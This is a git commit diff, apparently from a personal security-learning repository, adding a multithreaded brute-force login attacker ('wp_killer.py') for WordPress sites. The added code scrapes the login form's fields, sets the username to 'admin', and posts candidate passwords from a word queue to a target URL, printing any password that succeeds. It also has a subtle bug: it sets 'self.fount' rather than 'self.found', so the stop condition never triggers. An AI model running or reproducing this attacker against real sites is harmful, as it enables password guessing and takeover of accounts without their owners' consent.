572435e3a201b804bf19a74742ebdaa0fa486426
miketorii <miketorii@gmail.com>
2025-06-03 13:50:53 +0000

    add wp killer

--- cybersecurity/wp_killer.py
+++ cybersecurity/wp_killer.py
@@ -21,6 +21,17 @@ def get_words():
 
     return words
 
+def get_params(content):
+    params = dict()
+    parser = etree.HTMLParser()
+    tree = etree.parse(BytesIO(content), parser=parser)
+    for elem in tree.findall('//input'):
+        name = elem.get('name')
+        if name is not None:
+            params[name] = elem.get('value', None)
+
+    return params
+
 class Bruter:
     def __init__(self, username, url):
         self.username = username
@@ -31,9 +42,36 @@ class Bruter:
 
     def run_bruteforce(self, passwords):
         print("------run bruteforce-------")
-        print(passwords.get())
+        #print(passwords.get())
+        for _ in range(10):
+            t = threading.Thread(target=self.web_bruter, args=(passwords,))
+            t.start()
             
 
+    def web_bruter(self, passwords):
+        session = requests.Session()
+        resp0 = session.get(self.url)
+        params = get_params(resp0.content)
+        params['log'] = self.username
+
+        while not passwords.empty() and not self.found:
+            try:
+                time.sleep(5)
+                passwd = passwords.get()
+                print(passwd)
+                print(f"Trying username/password {self.username}/{passwd:<10}")
+                params['pwd'] = passwd
+                resp1 = session.post(self.url, data=params)
+
+                if SUCCESS in resp1.content.decode():
+                    self.fount = True
+                    print(f"\nBruteforcing successful.")
+                    print(f"Username is %s" % self.username)
+                    print(f"Password is %s\n" % passwd)                    
+                
+            except:
+                pass
+                    
 def run():
     print("---------run----------")
     b = Bruter("admin", TARGET)
